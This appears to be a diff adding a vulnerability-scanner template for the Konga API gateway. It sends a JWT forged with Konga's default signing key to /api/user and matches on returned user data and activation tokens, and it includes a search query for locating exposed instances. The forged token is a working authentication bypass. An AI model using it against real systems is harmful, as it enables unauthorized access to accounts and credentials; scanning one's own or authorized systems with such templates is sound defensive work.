@@ -1,0 +1,33 @@
+id: konga-default-jwt-key
+
+info:
+  name: KONGA Arbitrary user login vulnerability
+  author: SleepingBag945
+  severity: high
+  description: |
+    The default key of Konga JWT is oursecret, which can forge arbitrary user permissions
+    FOFA: app="Konga-Api-Gateway"
+  reference:
+    - https://mp.weixin.qq.com/s/8guU2hT3wE2puEztdGqZQg
+    - https://github.com/pantsel/konga
+  tags: kong,jwt,default
+
+http:
+  - raw:
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"createdUser":'
+          - '"username":'
+          - '"activationToken":'
+        part: body
+        condition: and
